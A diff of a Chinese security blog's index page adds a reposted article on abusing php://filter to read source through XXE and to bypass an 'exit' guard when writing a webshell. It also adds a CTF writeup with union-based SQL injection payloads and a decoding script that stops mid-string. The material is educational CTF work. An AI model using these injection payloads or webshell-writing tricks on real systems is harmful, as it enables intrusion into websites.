@@ -134,6 +134,116 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-转载 谈一谈php之filter的妙用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/09/01/转载 谈一谈php之filter的妙用/">转载 | php://filter的妙用</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/09/01/转载 谈一谈php之filter的妙用/" class="archive-article-date">
+  	<time datetime="2019-08-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-01</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载文章：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p><code>php://filter</code>是PHP中独有的协议，利用这个协议可以创造很多“妙用”，本文说几个有意思的点，剩下的大家自己下去体会。本来本文的思路我上半年就准备拿来做XDCTF2016的题目的，没想到被三个白帽的一题抢先用了，我也就只好提前分享一下。</p>
+<h2 id="XXE中的使用"><a href="#XXE中的使用" class="headerlink" title="XXE中的使用"></a>XXE中的使用</h2><p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错</p>
+<p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter</p>
+<p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-1.png" alt="1-1"></p>
+<p>访问并<code>POST</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-2.png" alt="1-2"></p>
+<p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-3.png" alt="1-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-4.png" alt="1-4"></p>
+<h2 id="巧用编码与解码"><a href="#巧用编码与解码" class="headerlink" title="巧用编码与解码"></a>巧用编码与解码</h2><p>使用编码不光可以帮助我们获取文件，也可以帮我们去除一些“不必要的麻烦”。</p>
+<p>记得前段时间三个白帽有个比赛，其中有一部分代码大概类似于以下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">'&lt;?php exit; ?&gt;'</span>;</span><br><span class="line">$content .= $_POST[<span class="string">'txt'</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">'filename'</span>], $content);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p>
+<p>幸运的是，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
+<p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET[<span class="string">'txt'</span>] = preg_replace(<span class="string">'|[^a-z0-9A-Z+/]|s'</span>, <span class="string">''</span>, $_GET[<span class="string">'txt'</span>]);</span><br><span class="line">base64_decode($_GET[<span class="string">'txt'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
+<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
+<p>最后效果是 ：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-5.png" alt="1-5"></p>
+<h2 id="利用字符串操作方法"><a href="#利用字符串操作方法" class="headerlink" title="利用字符串操作方法"></a>利用字符串操作方法</h2><p>有的同学说，base64的算法我不懂，上面的方法太复杂了。</p>
+<p>其实，除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p>
+<p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p>
+<p>编写如下测试代码即可查看 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo readfile(&apos;php://filter/read=string.strip_tags/resource=php://input&apos;);</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-6.png" alt="1-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-7.png" alt="1-7"></p>
+<p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p>
+<p>万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
+<p>最终的数据包如下：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-8.png" alt="1-8"></p>
+<p>除此之外，我们还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E8%BD%AC%E8%BD%BD/php%E4%B9%8Bfilter/1-9.png" alt="1-9"></p>
+<p>当然，这个方法的条件就是不开启短标签</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/09/01/转载 谈一谈php之filter的妙用/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Python — PyQt5库的初次应用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -250,116 +360,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/09/01/Python — PyQt5库的初次应用/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-转载 谈一谈php之filter的妙用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/09/01/转载 谈一谈php之filter的妙用/">转载 | php://filter的妙用</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/09/01/转载 谈一谈php之filter的妙用/" class="archive-article-date">
-  	<time datetime="2019-08-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载文章：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
-<p><code>php://filter</code>是PHP中独有的协议，利用这个协议可以创造很多“妙用”，本文说几个有意思的点，剩下的大家自己下去体会。本来本文的思路我上半年就准备拿来做XDCTF2016的题目的，没想到被三个白帽的一题抢先用了，我也就只好提前分享一下。</p>
-<h2 id="XXE中的使用"><a href="#XXE中的使用" class="headerlink" title="XXE中的使用"></a>XXE中的使用</h2><p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错</p>
-<p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter</p>
-<p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：</p>
-<p><img src alt="1-1"></p>
-<p>访问并<code>POST</code></p>
-<p><img src alt="1-2"></p>
-<p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱</p>
-<p><img src alt="1-3"></p>
-<p><img src alt="1-4"></p>
-<h2 id="巧用编码与解码"><a href="#巧用编码与解码" class="headerlink" title="巧用编码与解码"></a>巧用编码与解码</h2><p>使用编码不光可以帮助我们获取文件，也可以帮我们去除一些“不必要的麻烦”。</p>
-<p>记得前段时间三个白帽有个比赛，其中有一部分代码大概类似于以下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">'&lt;?php exit; ?&gt;'</span>;</span><br><span class="line">$content .= $_POST[<span class="string">'txt'</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">'filename'</span>], $content);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p>
-<p>幸运的是，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
-<p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
-<p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET[<span class="string">'txt'</span>] = preg_replace(<span class="string">'|[^a-z0-9A-Z+/]|s'</span>, <span class="string">''</span>, $_GET[<span class="string">'txt'</span>]);</span><br><span class="line">base64_decode($_GET[<span class="string">'txt'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
-<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
-<p>最后效果是 ：</p>
-<p><img src alt="1-5"></p>
-<h2 id="利用字符串操作方法"><a href="#利用字符串操作方法" class="headerlink" title="利用字符串操作方法"></a>利用字符串操作方法</h2><p>有的同学说，base64的算法我不懂，上面的方法太复杂了。</p>
-<p>其实，除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p>
-<p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p>
-<p>编写如下测试代码即可查看 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo readfile(&apos;php://filter/read=string.strip_tags/resource=php://input&apos;);</span><br></pre></td></tr></table></figure>
-<p><img src alt="1-6"></p>
-<p><img src alt="1-7"></p>
-<p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p>
-<p>万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
-<p>最终的数据包如下：</p>
-<p><img src alt="1-8"></p>
-<p>除此之外，我们还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p>
-<p><img src alt="1-9"></p>
-<p>当然，这个方法的条件就是不开启短标签</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/09/01/转载 谈一谈php之filter的妙用/">展开全文 >></a>
         </p>
       
 
@@ -1430,6 +1430,229 @@
 
 
   
+    <article id="post-CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/03/30/CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp/">2019“嘉韦思杯”上海高校网络安全邀请赛 — 初赛WriteUp</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/03/30/CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp/" class="archive-article-date">
+  	<time datetime="2019-03-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="安恒WriteUp"><a href="#安恒WriteUp" class="headerlink" title="安恒WriteUp"></a>安恒WriteUp</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247486458&amp;idx=1&amp;sn=96404a0ab43e7b4970c9404d00ce2fe0&amp;chksm=fbf7918acc80189ce0041525a471987c37047732b0eaafd117a7c52f9d2274bf60aef080a6a6&amp;mpshare=1&amp;scene=23&amp;srcid=#rd" target="_blank" rel="noopener">安恒2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp</a></p>
+<h3 id="官方WriteUp"><a href="#官方WriteUp" class="headerlink" title="官方WriteUp"></a>官方WriteUp</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxNTA4OTI5Mg==&amp;mid=2647708779&amp;idx=1&amp;sn=ac6bc3a3d912fc405d2d5b497ba47d22&amp;chksm=8fb9dd88b8ce549e5f037eb609cc3340c3362bca2678053f1dde0c99ce4108aa50f7d38e523a&amp;mpshare=1&amp;scene=23&amp;srcid=#rd" target="_blank" rel="noopener">官方2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp</a></p>
+<hr>
+<h3 id="第一题（土肥原贤二）"><a href="#第一题（土肥原贤二）" class="headerlink" title="第一题（土肥原贤二）"></a>第一题（土肥原贤二）</h3><p>SQL注入，gid通过单引号包裹，比较简单就呈现出来</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/1-1.png" alt="1-1"></p>
+<p>联合注入测试成功</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/1-2.png" alt="1-2"></p>
+<p>爆数据库、表、列、flag值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,2,3,table_name from information_schema.tables where table_schema=database() #</span><br><span class="line">-1&apos; union select 1,2,3,column_name from information_schema.columns where table_name=&apos;flag&apos; #</span><br><span class="line">-1&apos; union select 1,2,3,flag from flag #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/1-3.png" alt="1-3"></p>
+<p><code>flag{ 20_welcome_19 }</code></p>
+<hr>
+<h3 id="第二题（吴佩孚）"><a href="#第二题（吴佩孚）" class="headerlink" title="第二题（吴佩孚）"></a>第二题（吴佩孚）</h3><p>链接打开发现是Base64</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/2-1.png" alt="2-1"></p>
+<p>拿去在线网站解密一下，得到jsfuck</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/2-2.png" alt="2-2"></p>
+<p>直接放到Console，回车一下，flag就出来了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/2-3.png" alt="2-3"></p>
+<p><code>flag{sdf465454dfgert32}</code></p>
+<hr>
+<h3 id="第三题（死亡真相）"><a href="#第三题（死亡真相）" class="headerlink" title="第三题（死亡真相）"></a>第三题（死亡真相）</h3><p>下载下来一个wav文件，用Audacity打开看一下</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/3-1.png" alt="3-1"></p>
+<p>点击左上角那一小块，选择”波频图”，可以看到有信息出来</p>
+<p>但是加上下斜杠，提交时却是错的，官方特地说不是这个flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/3-2.png" alt="3-2"></p>
+<p>既然缺少信息，就放到winhex里面看一下，在末尾发现zero字样</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/3-3.png" alt="3-3"></p>
+<p>再看刚才的那串数字，想会不会是MD5，然后往空处补上0，刚好32位得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">85a9d4517d47250b908cbc9fd0554216</span><br></pre></td></tr></table></figure>
+<p>拿去在线网站解密一下，拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/3-4.png" alt="3-4"></p>
+<p><code>flag{hsd132456}</code></p>
+<hr>
+<h3 id="第四题（日军空袭）"><a href="#第四题（日军空袭）" class="headerlink" title="第四题（日军空袭）"></a>第四题（日军空袭）</h3><p>看到是Base64加密</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/4-1.png" alt="4-1"></p>
+<p>内容提取出来，放到Notepad++里面解密一下，发现后面接了%3D</p>
+<p>%3D就是等号（=）的URL编码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/4-2.png" alt="4-2"></p>
+<p>判断是base64混合url循环编码，直接写个Python脚本解码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">s = <span class="string">'Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1NHVkVRbUZXVmxsM1ZqQmFTMlJIVmtkWGJGcHBWa1phZVZadGVGWmxSbGw1Vkd0c2FsSnRhRzlVVm1oRFZWWmFkR05GZEZSTlZXdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbXRXTVhCRlZXeHdWMDFFUlRCV2Fra3hVakZhV0ZOcmFGWmlhMHBYV1d4b1UwMHhWWGhYYlhSWFRWWndNRlZ0ZUZOVWJVWTJVbFJDVjJFeVRYaFdSRVpyVTBaT2NscEhjRk5XUjNob1YxZDRiMVV4VWtkWGJrNVlZbGhTV0ZSV1pEQk9iR3hXVjJ4T1ZXSkdjRlpXYlhoelZqRmFObEZZYUZkU1JYQklWbXBHVDFkV2NFZGhSMnhUWVROQ1dsWXhXbXROUjFGNVZXNU9hbEp0VWxsWmJGWmhZMnhXY1ZKdFJsUlNiR3cxVkZaU1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKWVFrbFdiWEJIVkRGa1YyTkZaR2hTTW5oVVdWUk9RMWRzV1hoWGJYUk9VbTE0V0ZaWGRHdFdNV1JJWVVac1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5TUmxweFUydGFiRlpzU2xwWlZWcHJZVWRGZWxGcmJGZGlXRUpJVmtSS1UxWXhXblZWYldoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxkSFVsWlVWbHBIVFRGU2MxWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreU1VZFNiRkp6Vkcxc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQnhWV3hrVTFsV1VsWlhiVVpyWWtad2VGVnRkREJWTWtwSVZXcENXbFpXY0hKWlZXUkdaVWRPU0U5V2FHaE5WbkJ2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTVc5bGJHUllaVWM1YVUxWFVucFdNV2h2VjBkS1dWVnJPVlppVkVVd1ZqQmFZVmRIVWtoa1JtUnBWbGhDU2xkV1ZtOVVNVnAwVW01S1QxWnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYVFc1